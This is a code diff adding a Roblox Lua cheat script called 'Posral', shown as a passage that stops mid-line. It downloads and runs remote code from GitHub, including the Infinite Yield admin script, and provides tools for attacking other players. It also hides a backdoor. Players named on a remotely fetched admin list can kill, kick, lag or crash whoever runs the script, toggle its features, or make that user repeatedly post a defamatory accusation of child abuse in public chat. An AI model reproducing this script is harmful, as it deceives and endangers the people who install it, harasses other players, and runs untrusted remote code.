@@ -1,0 +1,266 @@
+
+
+gethui = function()
+ return game.CoreGui.RobloxGui
+end
+
+local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
+local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
+local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
+local Options = Library.Options
+local Toggles = Library.Toggles
+
+local TweenService = game:GetService("TweenService")
+local Analytics = game:GetService("RbxAnalyticsService")
+local UserInputService = game:GetService("UserInputService")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local rs = game:GetService("ReplicatedStorage")
+local RF = game:GetService("ReplicatedFirst")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+
+local DestroyToy = rs.MenuToys.DestroyToy
+local BombExplode = rs.BombEvents.BombExplode
+local SetNetOwner = rs.GrabEvents.SetNetworkOwner
+local CreateLine = rs.GrabEvents.CreateGrabLine
+local DestroyLine = rs.GrabEvents.DestroyGrabLine
+local SpawnToy = rs.MenuToys.SpawnToyRemoteFunction
+local Struggle = rs.CharacterEvents.Struggle
+local Ragdoll = rs.CharacterEvents.RagdollRemote
+local StopVel = rs.GameCorrectionEvents.StopAllVelocity
+local UpdLineColor = rs.DataEvents.UpdateLineColorsEvent
+local StickyEvent = rs.PlayerEvents.StickyPartEvent
+
+local jerkspeed = 0.1
+local spinspeed = 10
+local strength = 300
+local offset = CFrame.new(0, 15, 0)
+local PalletForRagdoll
+local Seats = {}
+local WhitelistEnabled = false
+
+local Lines = 0
+local Camera = workspace.CurrentCamera
+local plr = Players.LocalPlayer
+local Mouse = plr:GetMouse()
+local cons = {}
+local inv = workspace[plr.Name.."SpawnedInToys"]
+
+local char = plr.Character
+local HRP = char.HumanoidRootPart
+local hum = char.Humanoid
+
+plr.CharacterAdded:Connect(function(c)
+    task.wait(0.1)
+ if c then
+  HRP = c:FindFirstChild("HumanoidRootPart") or c:WaitForChild("HumanoidRootPart", 1)
+  hum = c:FindFirstChild("Humanoid") or c:WaitForChild("Humanoid", 1)
+  char = c
+ end
+end)
+
+local function gblob()
+ local char = plr.Character
+ local hum = char:WaitForChild("Humanoid", 0.1)
+    if hum and hum.SeatPart then
+        if hum.SeatPart.Parent.Name == "CreatureBlobman" then
+            return hum.SeatPart.Parent
+        end
+    end
+end
+
+local function disc(name)
+    for i,v in cons do
+        if i == name then
+            v:Disconnect()
+        end
+    end
+end
+
+local function getplot()
+    for i = 1, 5 do
+        local plot = workspace.Plots:FindFirstChild("Plot"..i)
+        local value = plot.PlotSign.ThisPlotsOwners:FindFirstChild("Value")
+        if plot and value and value.Value:find(plr.Name) then
+            return plot
+        end
+    end
+end
+
+local function sno(obj)
+    SetNetOwner:FireServer(obj, obj.CFrame)
+end
+
+local function spawntoy(toy, cf)
+    if not plr.CanSpawnToy.Value then
+        plr.CanSpawnToy.Changed:Wait()
+    end
+    local t
+    local toyadded
+    toyadded = inv.ChildAdded:Connect(function(c)
+        if c.Name == toy then
+            t = c
+            toyadded:Disconnect()
+        end
+    end)
+    task.spawn(function()
+        SpawnToy:InvokeServer(
+            toy,
+            cf,
+            Vector3.new(0,0,0)
+        )
+    end)
+    local time = tick() + 1
+    repeat task.wait() until t or tick() > time
+    if t then
+        return t
+    else
+        local plot = getplot()
+        if plot then
+            return workspace.PlotItems[plot.Name]:FindFirstChild(toy) or workspace.PlotItems[plot.Name]:WaitForChild(toy, 0.5)
+        end
+    end
+end
+
+local function grab(obj)
+    obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, char)
+end
+
+local function drop(obj, cf)
+    obj.HoldPart.DropItemRemoteFunction:InvokeServer(obj, cf, vector.create(0, 0, 0))
+end
+
+local function tp(obj1, obj2)
+    obj1.CFrame = CFrame.new(
+        obj2.Position + obj2.Velocity *
+        (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 1000) * 5
+    )
+end
+
+local function stvel(hrp)
+    hrp.AssemblyLinearVelocity = Vector3.zero
+    hrp.AssemblyAngularVelocity = Vector3.zero
+end
+
+local function getname(v)
+    return v:split(" ")[2]:split("(")[2]:split(")")[1]
+end
+
+local function HasProperty(obj, property)
+    local ok = pcall(function() if obj[property] then end end)
+    return ok
+end
+
+local admins = loadstring(game:HttpGet("https://raw.githubusercontent.com/Brovaky/Friendly/refs/heads/main/admins"))()
+
+rs.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(...)
+    local args = {...}
+    local s = args[1]
+    if s and typeof(args[2]) == "string" then
+        if table.find(admins, s.Name) then
+            local char = plr.Character
+            local txt = string.split(args[2], " ")
+            local nam = tostring(txt[2]):lower()
+            if txt[1] == "!kill" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                if char and char:FindFirstChild("Humanoid") then
+                    char.Humanoid.Health = 0
+                end
+            elseif txt[1] == "!bring" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                local char1 = game.Players:FindFirstChild(s.Name).Character
+                if char and char:FindFirstChild("HumanoidRootPart") and char1 and char1:FindFirstChild("HumanoidRootPart") then
+                    char.HumanoidRootPart.CFrame = char1.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
+                end
+            elseif txt[1] == "!kick" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                plr:Kick("Kicked by posral admin ("..game.Players[s.Name].DisplayName..")")
+            elseif txt[1] == "!reveal" and s.Name ~= plr.Name then
+                TextChatService.TextChannels.RBXGeneral:SendAsync("Ya Premium Nasral!")
+            elseif txt[1] == "!report" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                while task.wait(1) do
+                    TextChatService.TextChannels.RBXGeneral:SendAsync("i touch kids")
+                end
+            elseif txt[1] == "!lag" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                plr.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = true
+            elseif txt[1] == "!unlag" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                plr.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = false
+            elseif txt[1] == "!crash" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                while true do end
+            elseif txt[1] == "!on" and txt[3] and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                if not Toggles[txt[3]] then return end
+                Toggles[txt[3]]:SetValue(true)
+            elseif txt[1] == "!off" and txt[3] and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                if not Toggles[txt[3]] then return end
+                Toggles[txt[3]]:SetValue(false)
+            elseif txt[1] == "!setfps" and txt[3] and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
+                setfpscap(txt[3])
+            end
+        end
+    end
+end)
+
+local Window = Library:CreateWindow({
+    Title = "Posral",
+    Footer = "version: Иди нахуй не читай",
+    NotifySide = "Right",
+})
+
+local Tabs = {
+ Main = Window:AddTab("Main"),
+    Defence = Window:AddTab("Defence"),
+    Visual = Window:AddTab("Visual"),
+    Target = Window:AddTab("Target"),
+    Server = Window:AddTab("Server"),
+    Keybinds = Window:AddTab("Keybinds"),
+    Whitelist = Window:AddTab("Whitelist"),
+ ["UI Settings"] = Window:AddTab("UI Settings"),
+}
+do
+    local avatar = Tabs.Visual:AddLeftGroupbox("Just your avatar", "person-standing")
+
+    local avatarview = avatar:AddViewport("Just your avatar", {
+        Object = plr.Character,
+        Camera = Instance.new("Camera"),
+        Interactive = true,
+        AutoFocus = true,
+        Height = 400,
+    })
+
+    plr.CharacterAdded:Connect(function(chara)
+        task.wait(1)
+        avatarview:SetObject(chara:Clone())
+    end)
+end
+do
+
+local box = Tabs.Visual:AddRightGroupbox("Misc")
+
+box:AddToggle("AntiKickEsp", {
+    Text = "Anti Kick Esp",
+    Default = false,
+    Callback = function(v)
+        if v then
+            for _,pl in Players:GetPlayers() do
+                if pl~=plr then 
+                    for i,v in workspace[pl.Name.."SpawnedInToys"]:GetChildren() do
+                        if v:FindFirstChild("StickyPart") then
+                            local high = Instance.new("Highlight", v)
+                            high.Adornee = v
+                            if v.StickyPart.StickyWeld.Part1 then
+                                high.FillColor = Color3.fromRGB(192, 173, 0)
+                            else
+                                high.FillColor = Color3.fromRGB(0, 194, 0)
+                            end
+                            v.StickyPart.StickyWeld:GetPropertyChangedSignal("Part1"):Connect(function()
+                                if v.StickyPart.StickyWeld.Part1 then
+                                    high.FillColor = Color3.fromRGB(192, 173, 0)
+                                else
+                                    high.FillColor = Color3.fromRGB(0, 194, 0)
+                                end
+                            end)
+                        end
+                    end
+                    cons["antikickesp"..pl.Name] = workspace[pl.Name.."SpawnedInToys"].ChildAdded:Con
